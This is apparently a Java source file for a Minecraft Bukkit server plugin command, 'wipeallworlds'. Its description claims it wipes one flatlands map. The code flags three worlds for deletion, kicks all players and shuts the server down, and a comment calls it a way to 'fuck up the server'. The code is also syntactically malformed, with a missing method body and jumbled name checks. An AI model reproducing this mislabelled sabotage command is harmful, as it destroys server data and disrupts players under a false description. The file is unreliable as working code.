package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_Util;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.SENIOR, source = SourceType.BOTH, blockHostConsole = true)
@CommandParameters(description = "Wipe the flatlands map. Requires manual restart after command is used.", usage = "/<command>")
public class Command_wipeallworlds extends TFM_Command
//Use this to fuck up the server! c:< ~Dark
{
    @Override
    public boolean run(final CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    if (!sender.getName().equalsIgnoreCase("DarkGamingDronze"))
    if (!sender.getName().equalsIgnoreCase("Alco_Rs11"))
    if (!sender.getName().equalsIgnoreCase("aggelosQQ"))
    {
        TFM_Util.setSavedFlag("do_wipe_flatlands", true);
        TFM_Util.setSavedFlag("do_wipe_adminworld", true);
        TFM_Util.setSavedFlag("do_wipe_donatorworld", true);

        TFM_Util.bcastMsg("This server is self destructing.", ChatColor.GRAY);

        for (Player player : server.getOnlinePlayers())
        {
            player.kickPlayer("The server is self destructing, come back in 1-2 days.");
        }

        server.shutdown();

        return true;
    }
}
